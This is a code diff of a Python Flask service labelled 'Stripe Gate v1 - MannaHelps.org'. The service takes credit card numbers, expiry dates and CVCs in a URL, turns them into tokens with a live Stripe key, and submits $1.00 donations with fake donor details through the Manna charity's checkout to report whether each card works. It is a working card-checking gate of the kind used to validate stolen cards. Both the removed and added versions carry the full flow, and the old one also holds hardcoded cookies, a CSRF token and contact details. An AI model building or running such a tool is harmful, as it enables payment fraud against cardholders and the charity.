@@ -1,263 +1,25 @@
-from flask import Flask, request, jsonify
 import requests
 import json
 import re
 from urllib.parse import unquote
+from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
-def process_donation(card_info):
+# Persistent session to maintain cookies
+session = requests.Session()
+
+def log_final_response(response):
     try:
-        # Parse card information from pipe format
-        # Expected format: number|cvc|exp_month|exp_year
-        card_parts = card_info.split('|')
-        
-        if len(card_parts) < 4:
-            return {
-                "error_code": "invalid_card_format",
-                "response": {
-                    "code": "invalid_card_format",
-                    "message": "Card information should be in format: number|cvc|exp_month|exp_year"
-                }
-            }
-        
-        card_number = card_parts[0]
-        card_cvc = card_parts[1]
-        card_exp_month = card_parts[2]
-        card_exp_year = card_parts[3]
-        
-        # Hardcoded values for other fields
-        card_name = "ROCKYY"
-        card_address_line1 = "15th street"
-        card_address_city = "new york"
-        card_address_state = "FL"
-        card_address_zip = "10080"
-        
-        # Step 1: Get the donation page to obtain necessary cookies and tokens
-        cookies = {
-            'exp_last_visit': '1447575505',
-            'exp_csrf_token': '0ce603e7af21a5d4394caf0b89bbe897e88d3701',
-            '_ga': 'GA1.2.1117915817.1762935509',
-            '_gid': 'GA1.2.1658195410.1762935509',
-            '__stripe_sid': '01d3f6b5-3d3e-44e0-9948-0d85f5e103de2d8cb2',
-            '__stripe_mid': 'a325fa1c-5bb3-4c2a-94e8-ba609c4ef5cf12c1b2',
-            'exp_last_activity': '1762935567',
-            'exp_tracker': '%7B%220%22%3A%22donate%2Fmoney%22%2C%221%22%3A%22favicon.ico%22%2C%222%22%3A%22donate%2Fmoney%22%2C%223%22%3A%22donate%2Ffood%22%2C%22token%22%3A%22be8bc2cd902727048cb2fbbcd801038f51b93b13a76120f89fead31c27afe2920916b7a7673a979427ab17abafe84304%22%7D',
-            '_gat_UA-6832692-28': '1',
-            '_ga_QMGKB7VHFP': 'GS2.2.s1762935509$o1$g1$t1762935571$j60$l0$h0',
-        }
-
-        headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
-            'pragma': 'no-cache',
-            'priority': 'u=0, i',
-            'referer': 'https://www.mannahelps.org/donate/food/',
-            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
-        }
-
-        response = requests.get('https://www.mannahelps.org/donate/money/', cookies=cookies, headers=headers)
-        
-        # Update cookies from the response
-        cookies.update(response.cookies.get_dict())
-        
-        # Extract CSRF token from the page if needed
         try:
-            csrf_token_match = re.search(r'name="csrf_token" value="([^"]+)"', response.text)
-            if csrf_token_match:
-                csrf_token = csrf_token_match.group(1)
-                cookies['exp_csrf_token'] = csrf_token
-        except:
-            pass
-
-        # Step 2: Create a Stripe token with credit card information
-        headers = {
-            'accept': 'application/json',
-            'accept-language': 'en-US',
-            'cache-control': 'no-cache',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'pragma': 'no-cache',
-            'priority': 'u=1, i',
-            'referer': 'https://js.stripe.com/',
-            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
-        }
-
-        # Use the card information from the API parameter
-        data = f'time_on_page=67049&guid=55c950db-485d-4bbe-8c83-e79cb9bf493df4dc3f&muid=a325fa1c-5bb3-4c2a-94e8-ba609c4ef5cf12c1b2&sid=01d3f6b5-3d3e-44e0-9948-0d85f5e103de2d8cb2&key=pk_live_7EhDaYyXbPLKSk9IhDTiU0Kr&payment_user_agent=stripe.js%2F78ef418&card[number]={card_number}&card[cvc]={card_cvc}&card[exp_month]={card_exp_month}&card[exp_year]={card_exp_year}&card[name]={card_name}&card[address_line1]={card_address_line1}&card[address_city]={card_address_city}&card[address_state]={card_address_state}&card[address_zip]={card_address_zip}'
-
-        response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
-        
-        # Extract the Stripe token from the response
-        stripe_token = None
-        try:
-            token_data = response.json()
-            stripe_token = token_data.get('id')
-        except:
-            return {
-                "error_code": "token_creation_failed",
-                "response": {
-                    "code": "token_creation_failed",
-                    "message": "Failed to create Stripe token"
-                }
-            }
-        
-        # Step 4: Submit the donation form with the Stripe token
-        cookies = {
-            'exp_last_visit': '1447575505',
-            'exp_csrf_token': '0ce603e7af21a5d4394caf0b89bbe897e88d3701',
-            '_ga': 'GA1.2.1117915817.1762935509',
-            '_gid': 'GA1.2.1658195410.1762935509',
-            '__stripe_sid': '01d3f6b5-3d3e-44e0-9948-0d85f5e103de2d8cb2',
-            '__stripe_mid': 'a325fa1c-5bb3-4c2a-94e8-ba609c4ef5cf12c1b2',
-            'exp_tracker': '%7B%220%22%3A%22donate%2Fmoney%22%2C%221%22%3A%22favicon.ico%22%2C%222%22%3A%22donate%2Fmoney%22%2C%223%22%3A%22donate%2Ffood%22%2C%22token%22%3A%22be8bc2cd902727048cb2fbbcd801038f51b93b13a76120f89fead31c27afe2920916b7a7673a979427ab17abafe84304%22%7D',
-            'exp_last_activity': '1762935580',
-            '_ga_QMGKB7VHFP': 'GS2.2.s1762935509$o1$g1$t1762935584$j47$l0$h0',
-        }
-
-        headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://www.mannahelps.org',
-            'pragma': 'no-cache',
-            'priority': 'u=0, i',
-            'referer': 'https://www.mannahelps.org/donate/money/',
-            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
-        }
-
-        data = [
-            ('account', 'Programs/Services'),
-            ('amount', 'other'),
-            ('amnto-text', '1'),
-            ('extra_honor_of', ''),
-            ('extra_honor_address', ''),
-            ('extra_memory_of', ''),
-            ('extra_memory_address', ''),
-            ('amnto-text', ''),
-            ('name', card_name),
-            ('email', 'malcjaviusstorm@gmail.com'),
-            ('comfirmAddress', 'malcjaviusstorm@gmail.com'),
-            ('phone', '8529637412'),
-            ('address_line1', card_address_line1),
-            ('address_city', card_address_city),
-            ('address_state', card_address_state),
-            ('address_zip', card_address_zip),
-            ('formID', 'donate'),
-            ('csrf_token', '0ce603e7af21a5d4394caf0b89bbe897e88d3701'),
-            ('id', 'Manna Donation'),
-            ('itemInfo', 'One-Time Donation'),
-            ('interval', '1'),
-            ('amountInput', '1.00'),
-            ('id', 'Payment'),
-            ('utm_source', 'null'),
-            ('utm_medium', 'null'),
-            ('utm_campaign', 'null'),
-            ('gclid', 'null'),
-            ('stripeToken', stripe_token),  # Use the token from step 2
-        ]
-
-        response = requests.post('https://www.mannahelps.org/checkout/payment.php', cookies=cookies, headers=headers, data=data)
-        
-        # Process the final response
-        try:
-            # Try to parse JSON response
             response_json = response.json()
-            
-            # Extract error information if available
-            if 'error' in response_json:
-                error = response_json['error']
-                error_code = error.get('code', '')
-                message = error.get('message', '')
-                
-                # Format as requested
-                result = {
-                    "error_code": error_code,
-                    "response": {
-                        "code": error_code,
-                        "message": message
-                    }
-                }
-            else:
-                # If no error information is available, check if there's a success message
-                if 'success' in response_json:
-                    success = response_json['success']
-                    message = success.get('message', 'Transaction successful')
-                    
-                    result = {
-                        "error_code": "",
-                        "response": {
-                            "code": "success",
-                            "message": message
-                        }
-                    }
-                else:
-                    # No clear success or error, return the response as is
-                    result = {
-                        "error_code": "",
-                        "response": response_json
-                    }
-                
         except json.JSONDecodeError:
-            # If response is not JSON, try to extract error information from HTML
-            response_text = response.text
-            
-            # Look for specific error patterns in HTML
-            code_match = re.search(r'Code is:([^\n]+)', response_text)
-            message_match = re.search(r'Message is:([^\n]+)', response_text)
-            
-            error_code = code_match.group(1).strip() if code_match else ''
-            message = message_match.group(1).strip() if message_match else ''
-            
-            # If we couldn't find the error patterns, try other patterns
-            if not error_code and not message:
-                # Try to find any error messages in the HTML
-                error_match = re.search(r'<div[^>]*class="error"[^>]*>([^<]+)</div>', response_text)
-                if error_match:
-                    message = error_match.group(1).strip()
-                    error_code = "html_error"
-                else:
-                    # Try to find any alert messages
-                    alert_match = re.search(r'alert\(["\']([^"\']+)["\']\)', response_text)
-                    if alert_match:
-                        message = alert_match.group(1).strip()
-                        error_code = "alert_error"
-                    else:
-                        # Check if there's a success message
-                        success_match = re.search(r'<div[^>]*class="success"[^>]*>([^<]+)</div>', response_text)
-                        if success_match:
-                            message = success_match.group(1).strip()
-                            error_code = "success"
-                        else:
-                            # If no specific patterns found, return a generic response
-                            message = "Unable to determine transaction status"
-                            error_code = "unknown"
-            
-            # Format as requested
+            response_json = None
+
+        if response_json and 'error' in response_json:
+            error = response_json['error']
+            error_code = error.get('code', '')
+            message = error.get('message', '')
             result = {
                 "error_code": error_code,
                 "response": {
@@ -265,28 +27,195 @@ def process_donation(card_info):
                     "message": message
                 }
             }
-            
-        return result
-        
+        elif response_json:
+            result = {
+                "error_code": "",
+                "response": response_json
+            }
+        else:
+            # HTML fallback
+            text = response.text
+            code_match = re.search(r'Code is:([^<]+)', text, re.I)
+            message_match = re.search(r'Message is:([^<]+)', text, re.I)
+            error_code = code_match.group(1).strip() if code_match else "html_error"
+            message = message_match.group(1).strip() if message_match else "Unknown HTML error"
+
+            result = {
+                "error_code": error_code,
+                "response": {
+                    "code": error_code,
+                    "message": message
+                }
+            }
+
     except Exception as e:
-        return {
-            "error_code": "script_error",
+        result = {
+            "error_code": "parse_error",
             "response": {
-                "code": "script_error",
-                "message": f"An error occurred during the donation process: {str(e)}"
+                "code": "parse_error",
+                "message": f"Parse failed: {str(e)}"
             }
         }
 
-@app.route('/gate=stripe1$/cc=<card_info>')
-def stripe_gate(card_info):
-    # URL decode the card info
-    card_info = unquote(card_info)
-    
-    # Process the donation with the provided card information
-    result = process_donation(card_info)
-    
-    # Return the result as JSON
-    return jsonify(result)
+    print(json.dumps(result, indent=2))
+    return result
+
+def get_csrf_token():
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
+        'referer': 'https://www.mannahelps.org/donate/food/',
+        'upgrade-insecure-requests': '1',
+    }
+    try:
+        resp = session.get('https://www.mannahelps.org/donate/money/', headers=headers, timeout=15)
+        match = re.search(r'name="csrf_token"\s+value="([^"]+)"', resp.text)
+        return match.group(1) if match else None
+    except:
+        return None
+
+def create_stripe_token(cc, mm, yy, cvc):
+    # Normalize year
+    if len(yy) == 2:
+        yy = '20' + yy
+
+    headers = {
+        'accept': 'application/json',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://js.stripe.com',
+        'referer': 'https://js.stripe.com/',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
+    }
+
+    data = (
+        f'key=pk_live_7EhDaYyXbPLKSk9IhDTiU0Kr'
+        f'&payment_user_agent=stripe.js%2F78ef418'
+        f'&card[number]={cc}'
+        f'&card[exp_month]={mm}'
+        f'&card[exp_year]={yy}'
+        f'&card[cvc]={cvc}'
+        f'&card[name]=Test+User'
+        f'&card[address_line1]=123+Main+St'
+        f'&card[address_city]=Miami'
+        f'&card[address_state]=FL'
+        f'&card[address_zip]=33101'
+        f'&time_on_page=12345'
+    )
+
+    try:
+        resp = session.post('https://api.stripe.com/v1/tokens', headers=headers, data=data, timeout=20)
+        token_data = resp.json()
+        return token_data.get('id'), None
+    except Exception as e:
+        return None, f"Stripe error: {str(e)}"
+
+def submit_donation(stripe_token):
+    csrf_token = get_csrf_token()
+    if not csrf_token:
+        return {
+            "error_code": "csrf_failed",
+            "response": {"code": "csrf_failed", "message": "Could not retrieve CSRF token"}
+        }
+
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://www.mannahelps.org',
+        'referer': 'https://www.mannahelps.org/donate/money/',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
+        'upgrade-insecure-requests': '1',
+    }
+
+    data = [
+        ('account', 'Programs/Services'),
+        ('amount', 'other'),
+        ('amnto-text', '1'),
+        ('name', 'Test User'),
+        ('email', 'test@example.com'),
+        ('comfirmAddress', 'test@example.com'),
+        ('phone', '5551234567'),
+        ('address_line1', '123 Main St'),
+        ('address_city', 'Miami'),
+        ('address_state', 'FL'),
+        ('address_zip', '33101'),
+        ('formID', 'donate'),
+        ('csrf_token', csrf_token),
+        ('id', 'Manna Donation'),
+        ('itemInfo', 'One-Time Donation'),
+        ('interval', '1'),
+        ('amountInput', '1.00'),
+        ('id', 'Payment'),
+        ('utm_source', 'null'),
+        ('utm_medium', 'null'),
+        ('utm_campaign', 'null'),
+        ('gclid', 'null'),
+        ('stripeToken', stripe_token),
+    ]
+
+    try:
+        resp = session.post('https://www.mannahelps.org/checkout/payment.php', headers=headers, data=data, timeout=30)
+        return log_final_response(resp)
+    except Exception as e:
+        return {
+            "error_code": "submit_error",
+            "response": {"code": "submit_error", "message": str(e)}
+        }
+
+@app.route('/gate=stripe1$/cc=<path:card>', methods=['GET'])
+def stripe_gate(card):
+    try:
+        decoded = unquote(card)
+        parts = [p.strip() for p in decoded.split('|')]
+
+        if len(parts) != 4:
+            return jsonify({
+                "error_code": "invalid_format",
+                "response": {
+                    "code": "invalid_format",
+                    "message": "Format: cc|mm|yy|cvc (4 fields)"
+                }
+            }), 400
+
+        cc, mm, yy, cvc = parts
+
+        # Validate basic format
+        if not (cc.isdigit() and len(cc) >= 13 and len(cc) <= 19):
+            return jsonify({"error_code": "invalid_cc", "response": {"code": "invalid_cc", "message": "Invalid card number"}}), 400
+        if not (mm.isdigit() and 1 <= int(mm) <= 12):
+            return jsonify({"error_code": "invalid_mm", "response": {"code": "invalid_mm", "message": "Invalid month"}}), 400
+        if not (yy.isdigit() and len(yy) in [2, 4]):
+            return jsonify({"error_code": "invalid_yy", "response": {"code": "invalid_yy", "message": "Invalid year"}}), 400
+        if not (cvc.isdigit() and len(cvc) in [3, 4]):
+            return jsonify({"error_code": "invalid_cvc", "response": {"code": "invalid_cvc", "message": "Invalid CVC"}}), 400
+
+        # Create token
+        token, err = create_stripe_token(cc, mm, yy, cvc)
+        if not token:
+            return jsonify({
+                "error_code": "token_failed",
+                "response": {"code": "token_failed", "message": err or "Stripe token creation failed"}
+            }), 400
+
+        # Submit donation
+        result = submit_donation(token)
+        return jsonify(result), 200
+
+    except Exception as e:
+        return jsonify({
+            "error_code": "server_error",
+            "response": {"code": "server_error", "message": f"Server error: {str(e)}"}
+        }), 500
+
+@app.route('/')
+def home():
+    return """
+    <h2>Stripe Gate v1 - MannaHelps.org</h2>
+    <p><b>Endpoint:</b> <code>/gate=stripe1$/cc=4111111111111111|12|25|123</code></p>
+    <p>Format: <code>cc|mm|yy|cvc</code> (yy = 2 or 4 digits)</p>
+    <p>Charges $1.00</p>
+    """
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    print("Stripe Gate Server Running")
+    print("→ http://127.0.0.1:5000/gate=stripe1$/cc=4111111111111111|12|25|123")
+    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
